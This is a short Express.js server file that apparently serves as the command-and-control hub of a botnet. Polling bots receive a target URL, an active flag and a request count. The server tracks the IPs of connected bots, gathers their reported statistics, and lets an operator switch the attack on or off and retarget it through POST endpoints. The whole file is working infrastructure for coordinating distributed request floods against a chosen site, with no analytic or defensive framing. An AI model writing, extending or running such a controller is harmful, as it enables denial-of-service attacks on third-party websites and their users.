import express from "express";
import cors from "cors";
import bodyParser from "body-parser";

const PORT = 3001;
const app = express();

app.use(cors());
app.use(bodyParser.json());

app.set("trust proxy", true);

let status = true;
let target = "https://theuselessweb.com/";
let connectedBots = new Map();
let botsResponses = [];

app.post("/requestInfo", (req, res) => {
  console.log(req.body);
  res.status(200).send(req.body);
  return;
});

app.post("/setServerStatus", (req, res) => {
  status = req.body.status;
  res
    .status(200)
    .send(`Set server status to ${status ? "active" : "disabled"}`);
  console.log(`Set server status to ${status ? "active" : "disabled"}`);
});

app.get("/getTargetInfo", (req, res) => {
  connectedBots.set(req.ip, new Date());
  res.status(200).send({
    status: status,
    targetUrl: target,
    requestNum: 5,
  });
  console.log(connectedBots);
});

app.get("/getServerStatus", (req, res) => {
  res.status(200).send({
    status: status,
  });
});

app.post("/sendBotStat", (req, res) => {
  console.log(req.body);
  botsResponses.push(req.body);
  res.status(200).send(req.body);
});

app.get("/getBotsStats", (req, res) => {
  res.status(200).send({
    stats: botsResponses,
  });
});

app.post("/changeTarget", (req, res) => {
  target = req.body.target;
  res.status(200).end(`Set new target to ${target}`);
  console.log(`Set new target to ${target}`);
});

app.get("/getConnectedBots", (req, res) => {
  const date = new Date();

  let activeBots = Array.from(connectedBots)
    .filter((entry) => (date.getTime() - entry[1].getTime()) / 60000 < 10)
    .map((entry) => entry[0]);

  res.status(200).send(activeBots);
  console.log(activeBots);
});

app.listen(PORT, () => {
  console.log(`Example app listening on port ${PORT}`);
});
